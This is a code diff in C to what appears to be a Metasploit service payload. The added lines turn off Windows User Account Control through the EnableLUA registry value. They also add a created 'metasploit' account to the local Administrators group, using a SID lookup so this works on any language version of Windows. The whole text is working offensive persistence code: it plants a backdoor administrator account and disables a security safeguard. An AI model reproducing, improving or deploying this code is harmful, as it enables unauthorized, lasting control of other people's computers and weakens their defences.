@@ -22,6 +22,14 @@ void start(){
 	RegSetValueExA(mkey,"Start",0,REG_DWORD,(PBYTE)&four,sizeof(DWORD));
 	RegCloseKey(mkey);
 
+	//Disable UAC
+	HKEY uackey;
+	DWORD zero = 0;
+	RegOpenKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+		0,KEY_SET_VALUE|KEY_WOW64_64KEY,&uackey);
+	RegSetValueExA(uackey,"EnableLUA",0,REG_DWORD,(PBYTE)&zero,sizeof(DWORD));
+	RegCloseKey(uackey);
+
 	//add user
 	USER_INFO_1 userinfo;
 	userinfo.usri1_name = L"metasploit";
@@ -33,9 +41,23 @@ void start(){
 	userinfo.usri1_script_path = NULL;
 	DWORD res = NetUserAdd(NULL,1,(PBYTE)&userinfo,NULL);
 	if(res == NERR_Success){
+		//Get local admins SID
+		DWORD sidSize = SECURITY_MAX_SID_SIZE;
+		PSID adminsid = LocalAlloc(LMEM_FIXED,sidSize);
+		CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, adminsid, &sidSize);
+
+		//Get local admins group name
+		WCHAR namebuf[MAX_PATH];
+		DWORD namelen = MAX_PATH;
+		WCHAR domainBuf[MAX_PATH];
+		DWORD domainlen = MAX_PATH;
+		SID_NAME_USE snu;
+		LookupAccountSidW(NULL, adminsid, namebuf, &namelen, domainBuf, &domainlen, &snu);
+
+		//Now add user to local admins group
 		LOCALGROUP_MEMBERS_INFO_3 lgmi3;
 		lgmi3.lgrmi3_domainandname = userinfo.usri1_name;
-		NetLocalGroupAddMembers(NULL,L"Administrators",3,(PBYTE)&lgmi3,1);
+		NetLocalGroupAddMembers(NULL,namebuf,3,(PBYTE)&lgmi3,1);
 	}
 
 	//start metsvc
